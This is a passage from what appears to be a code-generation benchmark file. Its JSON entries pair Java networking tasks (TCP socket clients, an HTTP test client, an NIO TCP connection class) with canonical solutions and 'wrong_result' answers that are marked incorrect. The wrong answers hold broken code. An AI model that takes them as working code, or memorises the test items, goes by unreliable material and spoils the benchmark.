builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        return executeAndDefaultAssertions(builder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws Exception {\n        return get(uri, browserHeader());\n    }\n\n    public HttpResponse<String> post(String path) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(BodyPublishers.noBody())\n            .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[] ... headers) throws Exception {\n        URI uri = URI.create(String.format(\"http://%s:%s%s\", address.getHostName(), address.getPort(), path));\n        Builder builder = HttpRequest.newBuilder(uri);\n        for (String[] header : headers) {\n            builder.header(header[0], header[1]);\n        }\n        var response = httpClient.send(builder.build(), BodyHandlers.discarding());\n        response = response.previousResponse().orElse(null);\n        List<String> redirects = new ArrayList<>();\n        while (response != null) {\n            redirects.addAll(response.headers().allValues(\"location\"));\n            response = response.previousResponse().orElse(null);\n        }\n        return redirects;\n    }\n\n    static String[] browserHeader() {\n        return new String[] {\n            \"User-Agent\",\n            \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\"\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HttpCommunicationClient {\n    private final InetSocketAddress address;\n    private final HttpClient httpClient;\n\n    public HttpCommunicationClient(InetSocketAddress address) {\n        this.address = address;\n        this.httpClient = setupHttpClient(new ThreadPool());\n    }\n\n    private void setupHttpClient(ThreadPool threadPool) {\n        this.httpClient = HttpClient.newBuilder()\n                .redirect(HttpClient.Redirect.FOLLOW)\n                .executor(threadPool)\n                .build();\n    }\n\n    public void closeClient() {\n        httpClient.close();\n    }\n\n    private HttpResponse<String> executeAndDefaultAssertions(HttpRequest request) {\n        try {\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        } catch (IOException | InterruptedException e) {\n            throw new RuntimeException(\"Error during request\", e);\n        }\n    }\n\n    public HttpResponse<String> get(String path, String[] headers) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(address.getHostString() + \":\" + address.getPort() + path))\n                .headers(headers)\n                .GET()\n                .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public HttpResponse<String> browserGet(String uri) {\n        String[] userAgent = browserHeader();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(uri))\n                .header(\"User-Agent\", userAgent[0])\n                .GET()\n                .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public HttpResponse<String> post(String path) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(address.getHostString() + \":\" + address.getPort() + path))\n                .POST(HttpRequest.BodyPublishers.ofString(\"\"))\n                .build();\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[] headers) {\n        List<String> redirectLocations = new ArrayList<>();\n        String currentUrl = address.getHostString() + \":\" + address.getPort() + path;\n        try {\n            HttpClient nonRedirectClient = HttpClient.newBuilder()\n                    .redirect(HttpClient.Redirect.NEVER)\n                    .build();\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(currentUrl))\n                    .headers(headers)\n                    .GET()\n                    .build();\n            HttpResponse<String> response = nonRedirectClient.send(request, HttpResponse.BodyHandlers.ofString());\n            int statusCode = response.statusCode();\n            while (statusCode >= 300 && statusCode < 400) {\n                String location = response.headers().firstValue(\"Location\").orElse(null);\n                if (location != null) {\n                    redirectLocations.add(location);\n                    currentUrl = location;\n                    request = HttpRequest.newBuilder()\n                            .uri(URI.create(currentUrl))\n                            .GET()\n                            .build();\n                    response = nonRedirectClient.send(request, HttpResponse.BodyHandlers.ofString());\n                    statusCode = response.statusCode();\n                } else {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            // Handle exception\n        }\n        return redirectLocations;\n    }\n\n    public static String[] browserHeader() {\n        return new String[]{\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"};\n    }\n}"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends a message, and properly handles the connection lifecycle including cleanup.\n\nClass Description: The TCPClient class encapsulates functionality for creating a TCP client that connects to a specified server, sends a UTF-8 encoded message, and manages socket resources. It handles potential network exceptions and ensures proper resource cleanup.\n\nAttributes:\n- s: Socket - The socket object used for the TCP connection\n- dos: DataOutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(): void - Establishes a connection to the server at 127.0.0.1:5555, sends the message \"Happy\" after a 3-second delay, and handles connection cleanup. No parameters. No return value.",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPClient {\n\n    public void connect() {\n        Socket s = null;\n        DataOutputStream dos = null;\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            System.out.println(\"Yeah, I connected\");\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n            dos.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) {\n                    dos.close();\n                }\n                if (s != null) {\n                    s.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TCPClient {\n    private Socket s;\n    private DataOutputStream dos;\n\n    public void connect() {\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n            dos.close();\n            s.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The SocketClient class provides functionality for establishing a TCP connection to a server, sending messages, receiving responses, and managing connection resources. It encapsulates the socket communication logic using Java's IO and networking classes.\n\nAttributes:\n- theSocket: Socket - The socket object representing the connection to the server\n- out: PrintWriter - The output stream writer for sending data to the server\n- networkIn: BufferedReader - The input stream reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendMessage(String message) -> void - Sends a message to the connected server. The message is automatically flushed.\n- readResponse() -> String - Reads a line of response from the server. Throws IOException if reading fails.\n- close() -> void - Closes all connection resources (socket, input and output streams) safely. Handles any IOExceptions internally.",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class SocketClient {\n\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n        out = new PrintWriter(theSocket.getOutputStream());\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n        out.flush();\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketClient {\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        try {\n            theSocket = new Socket(host, port);\n            out = new PrintWriter(theSocket.getOutputStream(), true);\n            networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n        } catch (IOException e) {\n            throw new IOException(\"Failed to connect to server: \" + e.getMessage());\n        }\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (out != null) out.close();\n            if (networkIn != null) networkIn.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            // Handle internally, no exception thrown\n        }\n    }\n}"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function doesn't return any value, but sends data to the server and may print error information to stderr)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public void sendStringToServer(String message) {\n    try {\n        Socket socket = new Socket(\"localhost\", 8080);\n        OutputStream out = socket.getOutputStream();\n        out.write(message.getBytes());\n        out.flush();\n        socket.close();\n    } catch (IOException e) {\n        System.err.printf(\"Error connecting to server: %s%n\", e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a Java function that establishes a TCP client connection to a server, sends HTTP upgrade requests and echo messages, and verifies server responses.\n\nFunction Description: The function connects to a predefined server using TCP, sends an HTTP upgrade request followed by echo messages, and asserts the correctness of server responses. It handles basic client-server communication including connection establishment, data exchange, and connection termination.\n\nInput: \n- url: String - The URL path to be used in the HTTP GET request\n\nOutput: \n- None (void) - The function performs assertions to verify server responses but doesn't return any value. It throws IOException if any network communication fails.\n\nNote: The function uses predefined host address and port from DefaultServer class, and includes a helper method readBytes() (not shown) to read data from the input stream.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic void runTest(final String url) throws IOException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET \" + url + \" HTTP/1.1\\r\\nHost:default\\r\\nConnection: upgrade\\r\\nUpgrade: servlet\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    Assert.assertTrue(readBytes(in).startsWith(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n\n    out.write(\"Echo Messages\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"Echo Messages2\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages2\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"exit\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    out.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "public void testClientCommunication(String url) throws IOException {\n    String host = DefaultServer.getHost();\n    int port = DefaultServer.getPort();\n    try (Socket socket = new Socket(host, port)) {\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n        String upgradeRequest = \"GET /\" + url + \" HTTP/1.1\\r\\n\"\n                + \"Upgrade: websocket\\r\\n\"\n                + \"Connection: Upgrade\\r\\n\"\n                + \"Host: \" + host + \":\" + port + \"\\r\\n\\r\\n\";\n        out.write(upgradeRequest.getBytes());\n        out.flush();\n        String response = readBytes();\n        assert response.contains(\"HTTP/1.1 101 Switching Protocols\");\n        String echoMessage = \"ECHO_MESSAGE\";\n        out.write(echoMessage.getBytes());\n        out.flush();\n        String echoResponse = readBytes();\n        assert echoResponse.equals(echoMessage);\n    } catch (IOException e) {\n        throw e;\n    }\n}"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java's Socket API for establishing connections, sending and receiving data, and managing the connection state.\n\nClass Description: The SocketClient class is a singleton implementation that provides TCP client functionality. It manages a single socket connection, handles data transmission through input/output streams, and maintains connection state. The class includes methods for opening/closing connections, reading/writing data, and checking connection status.\n\nAttributes:\n- socketClient: [SocketClient] - Singleton instance of the class\n- socket: [Socket] - The TCP socket connection\n- outputStream: [OutputStream] - Output stream for sending data\n- inputStream: [InputStream] - Input stream for receiving data\n- isConnected: [boolean] - Connection status flag\n- DEFAULT_READ_BUFFER_SIZE: [int] - Default buffer size for reading data (32KB)\n- buffer: [byte[]] - Temporary buffer for reading data\n- receivedData: [byte[]] - Storage for received data\n\nMethods:\n- getInstance() -> [SocketClient] - Returns the singleton instance of SocketClient\n- openConnection(String ip, int port) -> [void] - Opens a connection to the specified IP and port\n- isConnected() -> [boolean] - Returns the current connection status\n- write(byte[] data) -> [void] - Synchronously writes data to the output stream\n- read(int bytesToBeRead) -> [int] - Synchronously reads specified number of bytes from input stream\n- getReceivedData() -> [byte[]] - Returns the last received data\n- closeConnection() -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SocketClient {\n\n    private static SocketClient socketClient = null;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected = false;\n    public static final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        if (!socket.isConnected()) {\n            isConnected = false;\n            return;\n        }\n        isConnected = true;\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n    }\n\n    public static SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public synchronized void write(byte[] data) throws IOException {\n        if (isConnected && socketClient.isConnected && outputStream != null) {\n            outputStream.write(data);\n        }\n    }\n\n    public synchronized int read(int bytesToBeRead) throws IOException {\n        int numBytesRead = 0;\n        int readNow;\n        int bytesToBeReadTemp = bytesToBeRead;\n        receivedData = new byte[DEFAULT_READ_BUFFER_SIZE];\n        while (numBytesRead < bytesToBeRead) {\n            readNow = inputStream.read(buffer, 0, bytesToBeReadTemp);\n            if (readNow <= 0) {\n                return numBytesRead;\n            } else {\n                System.arraycopy(buffer, 0, receivedData, numBytesRead, readNow);\n                numBytesRead += readNow;\n                bytesToBeReadTemp -= readNow;\n            }\n        }\n        return numBytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        try {\n            if (isConnected) {\n                inputStream.close();\n                outputStream.close();\n                socket.close();\n                isConnected = false;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class SocketClient {\n    private static SocketClient instance;\n    private static SocketClient socketClient;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected;\n    private static final int DEFAULT_READ_BUFFER_SIZE = 32768;\n    private byte[] buffer;\n    private byte[] receivedData;\n\n    private SocketClient() {\n        buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n        receivedData = new byte[0];\n    }\n\n    public static SocketClient getInstance() {\n        if (instance == null) {\n            instance = new SocketClient();\n        }\n        return instance;\n    }\n\n    public void openConnection(String ip, int port) throws Exception {\n        if (isConnected) {\n            closeConnection();\n        }\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        isConnected = true;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public void write(byte[] data) throws Exception {\n        if (!isConnected) {\n            throw new IllegalStateException(\"Not connected\");\n        }\n        outputStream.write(data);\n        outputStream.flush();\n    }\n\n    public int read(int bytesToBeRead) throws Exception {\n        if (!isConnected) {\n            throw new IllegalStateException(\"Not connected\");\n        }\n        int bytesRead = inputStream.read(buffer, 0, bytesToBeRead);\n        if (bytesRead > 0) {\n            receivedData = Arrays.copyOf(buffer, bytesRead);\n        }\n        return bytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        if (isConnected) {\n            try {\n                inputStream.close();\n                outputStream.close();\n                socket.close();\n            } catch (Exception e) {\n                // Handle exception\n            }\n            isConnected = false;\n            socket = null;\n            outputStream = null;\n            inputStream = null;\n            receivedData = new byte[0];\n        }\n    }\n}"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Create a function that establishes a TCP connection to a server, sends JSON-formatted measurement data, and then closes the connection.\n\nFunction Description: The function `doSocketTest` establishes a TCP socket connection to a specified server (localhost) on a predefined port. It generates JSON-formatted measurement data using a helper class, writes this data to the server through the socket's output stream, flushes the stream to ensure all data is sent, and then closes both the output stream and the socket to release resources.\n\nInput: \n- None (The function uses predefined constants `SERVER_SOCKET_PORT` and `HARDWARE_ID` for server port and hardware identification, respectively.)\n\nOutput: \n- None (The function does not return any value but sends data to the server and may throw exceptions if the connection or data transmission fails.)",
    "Canonical_solution": "import java.net.Socket;\n\npublic void doSocketTest() throws Exception {\n    Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n    byte[] encoded = EventsHelper.generateJsonMeasurementsMessage(HARDWARE_ID);\n    socket.getOutputStream().write(encoded);\n    socket.getOutputStream().flush();\n    socket.getOutputStream().close();\n    socket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.io.*;\nimport java.net.*;\n\npublic class SocketClient {\n    private static final int SERVER_SOCKET_PORT = 12345;\n    private static final String HARDWARE_ID = \"HW123\";\n\n    public void doSocketTest() throws IOException {\n        try (Socket socket = new Socket(\"localhost\", SERVER_SOCKET_PORT);\n             OutputStream out = socket.getOutputStream()) {\n            \n            String jsonData = JsonDataGenerator.generateJson(HARDWARE_ID);\n            out.write(jsonData.getBytes());\n            out.flush();\n        }\n    }\n}"
  },
  {
    "Task_id": 427,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The class should handle connection establishment, data transmission, and connection termination while managing network buffers and packet processing.\n\nClass Description: TCPConnection is a non-blocking TCP client implementation that extends an abstract connection class and implements a packet source interface. It manages socket communication, handles I/O operations asynchronously, and processes network packets with proper flow control.\n\nAttributes:\n- MTU: [int] - Maximum Transmission Unit size (16384 bytes)\n- MAX_PAYLOAD_SIZE: [int] - Maximum payload size after accounting for protocol headers\n- clientToNetwork: [StreamBuffer] - Buffer for data being sent from client to network\n- networkToClient: [Packetizer] - Handles packetization of incoming data\n- packetForClient: [IPv4Packet] - Current packet being processed for the client\n- channel: [SocketChannel] - NIO channel for TCP communication\n- selectionKey: [SelectionKey] - Registration key with the selector\n- interests: [int] - Current interest set for the selection key\n\nMethods:\n- TCPConnection([ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader]) -> [void] - Constructor that initializes the connection with necessary headers and registers the channel with the selector\n- disconnect() -> [void] - Closes the connection and releases resources\n- processReceive() -> [void] - Handles incoming data from the network when readable\n- processSend() -> [void] - Handles outgoing data to the network when writable\n- createChannel() -> [SocketChannel] - Creates and configures the socket channel\n- sendToNetwork([IPv4Packet packet]) -> [void] - Sends a packet to the network\n- updateInterests() -> [void] - Updates the selector's interest ops based on current state\n- mayRead() -> [boolean] - Determines if the channel should be registered for read operations\n- mayWrite() -> [boolean] - Determines if the channel should be registered for write operations\n- mayConnect() -> [boolean] - Determines if the channel is in connecting state",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements PacketSource {\n\n    private static final int MTU = 0x4000;\n    private static final int MAX_PAYLOAD_SIZE = MTU - 20 - 20;\n\n    private final StreamBuffer clientToNetwork = new StreamBuffer(4 * IPv4Packet.MAX_PACKET_LENGTH);\n    private final Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n\n    private final SocketChannel channel;\n    private final SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) throws IOException {\n        super(id, client);\n\n        TCPHeader shrinkedTcpHeader = tcpHeader.copy();\n        shrinkedTcpHeader.shrinkOptions();\n\n        networkToClient = new Packetizer(ipv4Header, shrinkedTcpHeader);\n        networkToClient.getResponseIPv4Header().swapSourceAndDestination();\n        networkToClient.getResponseTransportHeader().swapSourceAndDestination();\n\n        SelectionHandler selectionHandler = (selectionKey) -> {\n            if (selectionKey.isValid() && selectionKey.isConnectable()) {\n                processConnect();\n            }\n            if (selectionKey.isValid() && selectionKey.isReadable()) {\n                processReceive();\n            }\n            if (selectionKey.isValid() && selectionKey.isWritable()) {\n                processSend();\n            }\n            updateInterests();\n        };\n        channel = createChannel();\n        interests = SelectionKey.OP_CONNECT;\n        selectionKey = channel.register(selector, interests, selectionHandler);\n    }\n\n    @Override\n    public void disconnect() {\n        selectionKey.cancel();\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private void processReceive() {\n        try {\n            assert packetForClient == null;\n            int remainingClientWindow = getRemainingClientWindow();\n            assert remainingClientWindow > 0;\n            int maxPayloadSize = Math.min(remainingClientWindow, MAX_PAYLOAD_SIZE);\n            updateHeaders(TCPHeader.FLAG_ACK | TCPHeader.FLAG_PSH);\n            packetForClient = networkToClient.packetize(channel, maxPayloadSize);\n            if (packetForClient == null) {\n                eof();\n                return;\n            }\n            consume(this);\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private void processSend() {\n        try {\n            int w = clientToNetwork.writeTo(channel);\n            if (w > 0) {\n                acknowledgementNumber += w;\n\n                if (finReceived && clientToNetwork.isEmpty()) {\n                    doHandleFin();\n                } else {\n                    sendEmptyPacketToClient(TCPHeader.FLAG_ACK);\n                }\n            } else {\n                close();\n            }\n        } catch (IOException e) {\n            resetConnection();\n        }\n    }\n\n    private SocketChannel createChannel() throws IOException {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(getRewrittenDestination());\n        return socketChannel;\n    }\n\n    @Override\n    public void sendToNetwork(IPv4Packet packet) {\n        handlePacket(packet);\n        updateInterests();\n    }\n\n    protected void updateInterests() {\n        if (!selectionKey.isValid()) {\n            return;\n        }\n        int interestOps = 0;\n        if (mayRead()) {\n            interestOps |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            interestOps |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            interestOps |= SelectionKey.OP_CONNECT;\n        }\n        if (interests != interestOps) {\n            interests = interestOps;\n            selectionKey.interestOps(interestOps);\n        }\n    }\n\n    private boolean mayRead() {\n        if (!state.isConnected() || state.isClosed()) {\n            return false;\n        }\n        if (packetForClient != null) {\n            return false;\n        }\n        return getRemainingClientWindow() > 0;\n    }\n\n    private boolean mayWrite() {\n        return !clientToNetwork.isEmpty();\n    }\n\n    private boolean mayConnect() {\n        return state == State.SYN_SENT;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nabstract class Connection {\n    protected final int id;\n    protected final Client client;\n    protected final Selector selector;\n    protected final IPv4Header ipv4Header;\n    protected final TCPHeader tcpHeader;\n    protected final Queue<IPv4Packet> packets = new LinkedList<>();\n    protected final AtomicBoolean running = new AtomicBoolean(true);\n\n    public Connection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) {\n        this.id = id.getId();\n        this.client = client;\n        this.selector = selector;\n        this.ipv4Header = ipv4Header;\n        this.tcpHeader = tcpHeader;\n    }\n\n    public void disconnect() {\n        running.set(false);\n        try {\n            if (channel != null) {\n                channel.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void processReceive();\n    protected abstract void processSend();\n    protected abstract void sendToNetwork(IPv4Packet packet);\n    protected abstract void updateInterests();\n    protected abstract boolean mayRead();\n    protected abstract boolean mayWrite();\n    protected abstract boolean mayConnect();\n}\n\nclass TCPConnection extends Connection {\n    private final int MTU = 16384;\n    private final int MAX_PAYLOAD_SIZE = MTU - 40; // Assuming 40 bytes for headers\n    private final StreamBuffer clientToNetwork = new StreamBuffer(MAX_PAYLOAD_SIZE);\n    private final Packetizer networkToClient = new Packetizer();\n    private IPv4Packet packetForClient;\n    private final SocketChannel channel;\n    private final SelectionKey selectionKey;\n    private final int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) {\n        super(id, client, selector, ipv4Header, tcpHeader);\n        this.channel = createChannel();\n        this.selectionKey = channel.register(selector, 0);\n        this.interests = 0;\n        updateInterests();\n    }\n\n    @Override\n    public void disconnect() {\n        super.disconnect();\n        if (selectionKey != null) {\n            selectionKey.cancel();\n        }\n    }\n\n    @Override\n    public void processReceive() {\n        try {\n            int bytesRead = channel.read(networkToClient.getBuffer());\n            if (bytesRead > 0) {\n                networkToClient.processData();\n                packetForClient = networkToClient.getNextPacket();\n                if (packetForClient != null) {\n                    client.processPacket(packetForClient);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void processSend() {\n        try {\n            if (!clientToNetwork.isEmpty()) {\n                ByteBuffer buffer = clientToNetwork.getBuffer();\n                while (buffer.hasRemaining()) {\n                    int bytesSent = channel.write(buffer);\n                    if (bytesSent == 0) break;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void sendToNetwork(IPv4Packet packet) {\n        try {\n            ByteBuffer buffer = ByteBuffer.allocate(packet.getSize());\n            packet.serialize(buffer);\n            clientToNetwork.write(buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void updateInterests() {\n        if (mayRead()) {\n            interests |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            interests |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            interests |= SelectionKey.OP_CONNECT;\n        }\n        selectionKey.interestOps(interests);\n    }\n\n    @Override\n    public boolean mayRead() {\n        return channel.isReadable();\n    }\n\n    @Override\n    public boolean mayWrite() {\n        return channel.isWritable();\n    }\n\n    @Override\n    public boolean mayConnect() {\n        return channel.isConnectionPending();\n    }\n\n    private SocketChannel createChannel() throws IOException {\n        SocketChannel channel = SocketChannel.open();\n        channel.configureBlocking(false);\n        channel.socket().setSoTimeout(10000);\n        channel.socket().setTcpNoDelay(true);\n        return channel;\n    }\n}\n\nclass StreamBuffer {\n    private final Queue<ByteBuffer> buffers = new LinkedList<>();\n    private final int maxPayloadSize;\n\n    public StreamBuffer(int maxPayloadSize) {\n        this.maxPayloadSize = maxPayloadSize;\n    }\n\n    public void write(ByteBuffer buffer) {\n        buffers.add(buffer);\n    }\n\n    public ByteBuffer getBuffer() {\n        return buffers.poll();\n    }\n\n    public boolean isEmpty() {\n        return buffers.isEmpty();\n    }\n}\n\nclass Packetizer {\n    private final Queue<ByteBuffer> buffers = new LinkedList<>();\n    private IPv4Packet currentPacket;\n\n    public void processData() {\n        ByteBuffer buffer = buffers.poll();\n        if (buffer == null) return;\n        // Simulate packetization logic\n        if (currentPacket == null) {\n            currentPacket = new IPv4Packet();\n            currentPacket.deserialize(buffer);\n        } else {\n            currentPacket.addData(buffer);\n        }\n    }\n\n    public IPv4Packet getNextPacket() {\n        return currentPacket;\n    }\n}\n\nclass IPv4Packet {\n    private byte[] data;\n\n    public int getSize() {\n        return data.length;\n    }\n\n    public void serialize(ByteBuffer buffer) {\n        // Simulated serialization\n        buffer.put(data);\n    }\n\n    public void deserialize(ByteBuffer buffer) {\n        // Simulated deserialization\n        data = new byte[buffer.remaining()];\n        buffer.get(data);\n    }\n\n    public void addData(ByteBuffer buffer) {\n        // Simulated data addition\n    }\n}\n```"
  },
  {
    "Task_id": 429,
